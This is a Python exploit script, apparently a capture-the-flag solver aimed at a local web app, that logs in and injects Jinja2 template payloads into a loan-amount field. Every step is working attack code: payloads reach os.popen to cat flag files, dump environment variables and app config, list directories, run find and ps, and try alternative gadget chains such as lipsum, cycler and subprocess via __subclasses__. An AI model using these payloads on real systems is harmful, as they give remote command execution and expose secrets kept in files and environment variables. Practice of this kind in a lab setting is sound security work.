import requests
import re
import sys

# Configuration
base_url = "http://127.0.0.1:32841"
login_url = f"{base_url}/login"
loan_url = f"{base_url}/total_loan_payments"

# Credentials for login
credentials = {"username": "test", "password": "test"}

# Common flag locations to test
flag_files = [
    "/flag",
    "/flag.txt", 
    "/app/flag",
    "/app/flag.txt",
    "/tmp/flag",
    "/tmp/flag.txt",
    "/etc/flag",
    "/root/flag",
    "/root/flag.txt",
    "/home/flag",
    "/home/flag.txt"
]

print("="*60)
print("SSTI EXPLOIT - Reading Files and Environment Variables")
print("="*60)

# Step 1: Login to get session cookie
print(f"\n[1] Logging in to {login_url}")
session = requests.Session()
try:
    login_response = session.post(login_url, data=credentials)
    print(f"[+] Login status: {login_response.status_code}")
    print(f"[+] Session cookies: {session.cookies.get_dict()}")
    
    if login_response.status_code != 200:
        print("[!] Login failed, aborting")
        sys.exit(1)
        
except Exception as e:
    print(f"[!] Login error: {e}")
    sys.exit(1)

# Step 2: Test reading flag files
print(f"\n[2] Testing file reads via SSTI")
print("-" * 60)

file_payload = """{{ config.__class__.__init__.__globals__['os'].popen("cat %s").read() }}"""

for filepath in flag_files:
    payload = file_payload % filepath
    print(f"\n[*] Testing: {filepath}")
    
    try:
        response = session.post(loan_url, data={"loan_amount": payload})
        
        # Check for flag pattern
        flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
        if flag_match:
            print(f"[!] FLAG FOUND: {flag_match.group(0)}")
            print(f"[!] Via file: {filepath}")
            print(f"\nFull response: {response.text}")
        elif response.text.strip() and len(response.text.strip()) > 10:
            # Show interesting responses
            print(f"[+] File content ({len(response.text)} chars): {response.text[:200]}")
        else:
            print(f"[-] No content or generic response")
            
    except Exception as e:
        print(f"[!] Error: {e}")

# Step 3: Test environment variables
print(f"\n[3] Testing environment variable access")
print("-" * 60)

env_payloads = [
    ("All env vars", """{{ config.__class__.__init__.__globals__['os'].environ }}"""),
    ("FLAG env var", """{{ config.__class__.__init__.__globals__['os'].environ.get('FLAG', 'Not found') }}"""),
    ("flag env var", """{{ config.__class__.__init__.__globals__['os'].environ.get('flag', 'Not found') }}"""),
    ("FLAG_* env vars", """{{ config.__class__.__init__.__globals__['os'].popen('env | grep -i flag').read() }}"""),
    ("*FLAG* env vars", """{{ config.__class__.__init__.__globals__['os'].popen('env | grep FLAG').read() }}""")
]

for name, payload in env_payloads:
    print(f"\n[*] Testing: {name}")
    
    try:
        response = session.post(loan_url, data={"loan_amount": payload})
        
        # Check for flag pattern
        flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
        if flag_match:
            print(f"[!] FLAG FOUND: {flag_match.group(0)}")
            print(f"[!] Via: {name}")
            print(f"\nFull response: {response.text}")
        elif response.text.strip() and 'Not found' not in response.text:
            print(f"[+] Environment data ({len(response.text)} chars): {response.text[:300]}")
        else:
            print(f"[-] No flag found in environment")
            
    except Exception as e:
        print(f"[!] Error: {e}")

# Step 4: Test config dumping
print(f"\n[4] Testing config object dumping")
print("-" * 60)

config_payloads = [
    ("Config dict", """{{ config }}"""),
    ("Config items", """{{ config.items() }}"""),
    ("Config class", """{{ config.__class__ }}"""),
    ("Config dir", """{{ config.__dir__() }}""")
]

for name, payload in config_payloads:
    print(f"\n[*] Testing: {name}")
    
    try:
        response = session.post(loan_url, data={"loan_amount": payload})
        
        # Check for flag pattern
        flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
        if flag_match:
            print(f"[!] FLAG FOUND: {flag_match.group(0)}")
            print(f"[!] Via: {name}")
            print(f"\nFull response: {response.text}")
        elif response.text.strip() and len(response.text.strip()) > 10:
            print(f"[+] Config data ({len(response.text)} chars): {response.text[:300]}")
        else:
            print(f"[-] No useful config data")
            
    except Exception as e:
        print(f"[!] Error: {e}")

# Step 5: Test command execution and directory listing
print(f"\n[5] Testing command execution")
print("-" * 60)

cmd_payloads = [
    ("List root", """{{ config.__class__.__init__.__globals__['os'].popen('ls -la /').read() }}"""),
    ("List /app", """{{ config.__class__.__init__.__globals__['os'].popen('ls -la /app').read() }}"""),
    ("List current dir", """{{ config.__class__.__init__.__globals__['os'].popen('ls -la').read() }}"""),
    ("Find flag files", """{{ config.__class__.__init__.__globals__['os'].popen('find / -name "flag*" 2>/dev/null').read() }}"""),
    ("Check running env", """{{ config.__class__.__init__.__globals__['os'].popen('ps aux').read() }}""")
]

for name, payload in cmd_payloads:
    print(f"\n[*] Testing: {name}")
    
    try:
        response = session.post(loan_url, data={"loan_amount": payload})
        
        # Check for flag pattern
        flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
        if flag_match:
            print(f"[!] FLAG FOUND: {flag_match.group(0)}")
            print(f"[!] Via: {name}")
            print(f"\nFull response: {response.text}")
        elif response.text.strip() and len(response.text.strip()) > 10:
            print(f"[+] Command output ({len(response.text)} chars): {response.text[:500]}")
        else:
            print(f"[-] No output")
            
    except Exception as e:
        print(f"[!] Error: {e}")

# Step 6: Test alternative traversal methods
print(f"\n[6] Testing alternative traversal methods")
print("-" * 60)

alt_payloads = [
    ("Using lipsum", """{{ lipsum.__globals__['os'].popen('cat /flag*').read() }}"""),
    ("Using cycler", """{{ cycler.__init__.__globals__['os'].popen('cat /flag*').read() }}"""),
    ("Using range", """{{ range.__init__.__globals__['os'].popen('cat /flag*').read() }}"""),
    ("Subprocess module", """{{ ''.__class__.__mro__[2].__subclasses__()[340]('cat /flag*', shell=True, stdout=-1).communicate() }}""")
]

for name, payload in alt_payloads:
    print(f"\n[*] Testing: {name}")
    
    try:
        response = session.post(loan_url, data={"loan_amount": payload})
        
        # Check for flag pattern
        flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
        if flag_match:
            print(f"[!] FLAG FOUND: {flag_match.group(0)}")
            print(f"[!] Via: {name}")
            print(f"\nFull response: {response.text}")
        elif response.text.strip() and len(response.text.strip()) > 10:
            print(f"[+] Output ({len(response.text)} chars): {response.text[:500]}")
            
    except Exception as e:
        print(f"[!] Error: {e}")

print(f"\n{'='*60}")
print("EXPLOIT COMPLETED")
print("="*60)
